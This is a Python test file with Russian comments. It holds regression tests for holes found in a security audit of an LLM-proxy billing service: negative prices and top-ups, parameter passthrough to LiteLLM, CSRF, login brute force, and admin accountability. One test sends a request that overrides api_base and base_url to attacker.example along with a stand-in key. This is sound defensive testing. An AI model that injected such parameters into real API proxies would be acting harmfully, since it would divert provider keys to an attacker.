"""Автотесты на дыры, найденные security-аудитом 2026-09-03 (см. CLAUDE.md):
отрицательная цена промпта позволяла клиенту печатать себе баланс, свободный
проброс **kwargs в LiteLLM позволял подменить api_base/api_key и увести
реальный ключ провайдера атакующему, формы не имели явной CSRF-защиты, а
решения админа (подтвердить/отклонить/выдать) нигде не фиксировали, КТО из
админов их принял. Хелперы продублированы из test_features_wave2.py
намеренно (см. обоснование там)."""

import asyncio

from sqlalchemy import select

from app.db import SessionLocal
from app.db.models import Customer, TopupRequest
from app.integrations import llm

ADMIN_EMAIL = "admin@test.local"
ADMIN_PASSWORD = "AdminPass123"


def _signup(client, email, name="Test User", password="TestPass123"):
    r = client.post(
        "/signup", data={"email": email, "name": name, "password": password}, follow_redirects=True
    )
    assert r.status_code == 200


def _issue_api_key(client):
    import re

    r = client.post("/api-key/regenerate")
    assert r.status_code == 200
    m = re.search(r"nh_[A-Za-z0-9_-]+", r.text)
    assert m
    return m.group(0)


def _admin_client():
    from fastapi.testclient import TestClient

    from app.main import app

    admin = TestClient(app)
    r = admin.post("/login", data={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD})
    assert r.status_code in (200, 303)
    return admin


def _topup(client, admin, amount="50"):
    import re

    client.post("/topups/new", data={"amount_rub": amount})
    m = re.search(r"admin/topups/(\d+)/confirm", admin.get("/admin/topups").text)
    assert m
    r = admin.post(f"/admin/topups/{m.group(1)}/confirm")
    assert r.status_code in (200, 303)


def test_prompt_with_negative_price_is_rejected(client):
    _signup(client, "negprice@test.local")
    r = client.post("/prompts", data={"title": "Bad", "system_prompt": "x", "price_rub": "-5"})
    assert r.status_code == 400

    # тот же путь, но через 0 — тоже не должно проходить (не "положительное")
    r = client.post("/prompts", data={"title": "Bad2", "system_prompt": "x", "price_rub": "0"})
    assert r.status_code == 400


def test_topup_with_negative_amount_is_rejected(client):
    _signup(client, "negtopup@test.local")
    r = client.post("/topups/new", data={"amount_rub": "-100"})
    assert r.status_code == 400


def test_chat_completions_strips_dangerous_llm_kwargs(client, monkeypatch):
    captured = {}

    async def _capture_fallback(alias, messages, **kwargs):
        captured.update(kwargs)
        return (
            alias,
            "openai",
            "gpt-5-mini",
            {
                "usage": {
                    "prompt_tokens": 1,
                    "completion_tokens": 1,
                    "prompt_tokens_details": {"cached_tokens": 0},
                },
                "choices": [{"message": {"content": "ok"}}],
            },
        )

    monkeypatch.setattr(llm, "chat_completion_with_fallback", _capture_fallback)

    _signup(client, "extraparams@test.local")
    api_key = _issue_api_key(client)
    admin = _admin_client()
    _topup(client, admin, "50")

    r = client.post(
        "/v1/chat/completions",
        headers={"Authorization": f"Bearer {api_key}"},
        json={
            "model": "gpt-5-mini",
            "messages": [{"role": "user", "content": "hi"}],
            "temperature": 0.5,
            "api_base": "http://attacker.example/v1",
            "api_key": "sk-stolen",
            "base_url": "http://attacker.example/v1",
        },
    )
    assert r.status_code == 200

    # разрешённый параметр прошёл, опасные — нет
    assert captured.get("temperature") == 0.5
    assert "api_base" not in captured
    assert "api_key" not in captured
    assert "base_url" not in captured


def test_login_rate_limited_after_repeated_failures(client):
    _signup(client, "bruteforce_target@test.local")
    for _ in range(10):
        client.post("/login", data={"email": "bruteforce_target@test.local", "password": "wrong"})
    r = client.post("/login", data={"email": "bruteforce_target@test.local", "password": "wrong"})
    assert r.status_code == 429


def test_cross_site_post_is_blocked(client):
    _signup(client, "csrftarget@test.local")
    r = client.post(
        "/topups/new",
        data={"amount_rub": "100"},
        headers={"Origin": "https://attacker.example"},
    )
    assert r.status_code == 403


def test_same_origin_post_with_origin_header_is_allowed(client):
    _signup(client, "sameorigin@test.local")
    r = client.post(
        "/topups/new",
        data={"amount_rub": "100"},
        headers={"Origin": str(client.base_url)},
        follow_redirects=False,
    )
    assert r.status_code == 303


def test_admin_action_records_which_admin_decided(client):
    _signup(client, "audittarget@test.local")
    client.post("/topups/new", data={"amount_rub": "100"})
    admin = _admin_client()

    import re

    m = re.search(r"admin/topups/(\d+)/confirm", admin.get("/admin/topups").text)
    assert m
    topup_id = int(m.group(1))
    r = admin.post(f"/admin/topups/{topup_id}/confirm")
    assert r.status_code in (200, 303)

    async def _check():
        async with SessionLocal() as session:
            topup = await session.get(TopupRequest, topup_id)
            admin_customer = (
                await session.execute(select(Customer).where(Customer.email == ADMIN_EMAIL))
            ).scalar_one()
            return topup.decided_by_admin_id, admin_customer.id

    decided_by, admin_id = asyncio.run(_check())
    assert decided_by == admin_id
